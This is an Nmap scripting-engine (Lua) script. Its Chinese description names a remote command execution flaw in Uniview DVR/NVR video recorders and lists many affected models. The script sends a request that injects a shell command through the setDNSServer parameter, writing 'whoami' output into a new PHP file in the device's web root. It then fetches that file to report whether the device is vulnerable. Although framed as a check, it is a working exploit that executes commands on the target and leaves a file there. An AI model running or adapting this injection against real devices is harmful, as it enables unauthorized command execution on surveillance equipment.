local http = require "http"
local stdnse = require "stdnse"
local string = require "string"
local shortport = require "shortport"


description = [[
宇视视频(DVR/NVR)远程命令执行漏洞
影响设备型号：ECR3316_HF ECR3316-HF ECR3308_HF ECR3308-HF ISC3500E ISC3500E ISC3500S ISC3500S ECR3316_HF_E ECR3316-HF-E ECR3308 _HF_E ECR3308-HF-E 
ECR3316_HF_S ECR3316-HF-S ECR3308_HF_S ECR3308-HF-S ISC3500_ET ISC3500-ET ISC3500_EL ISC3500-EL ISC3500_ST ISC3500-ST ISC3500_SL ISC3500-SL 
ECR2104_HF ECR2104-HF ECR2108_HF ECR2108-HF ISC2500_SP ISC2500-SP ISC2500_EP ISC2500-EP ISC2500_E ISC2500-E ISC2500_S ISC2500-S ISC2500_L 
ISC2500-L ECR3308_HF_SC ECR3308-HF-SC ECR3316_HF_SC ECR3316-HF-SC ISC3500_LC ISC3500-LC ISC3500_SC ISC3500-SC ISC3500_EC ISC3500-EC ISC5000-E
]]

author = "seaung"


license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"uniview_dvr_nvr_rce_03"}

portrule = shortport.port_or_service( {80, 443}, {"http", "https"}, "tcp", "open")

action = function(host, port)
	local output = stdnse.output_table()
	local url1 = [[/Interface/DevManage/VM.php?cmd=setDNSServer&DNSServerAdrr=" | whoami >/usr/local/program/ecrwww/apache/htdocs/Interface/DevManage/yzkx.php]]
	local url2 = "/Interface/DevManage/yzkx.php"
	local options = {header={}}
	options["header"]["Accept"] = "*/*"
	options["header"]["Accept-Language"] = "en-US,en;q=0.8"
	options["header"]["Cache-Control"] = "max-age=0"
	options["header"]["User-Agent"] = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36"
	options["header"]["Connection"] = "keep-alive"
	
	local res1 = http.get(host, port, url1, options)
	local res2 = http.get(host, port, url2, options)
	
	body = res2.body

	if res2.status == 200 and string.match(body, "<title>") and not string.match(body, "404") then
		output = "Found vulnerable."
	else
		output = "Not vulnerable."
	end
	return output
end

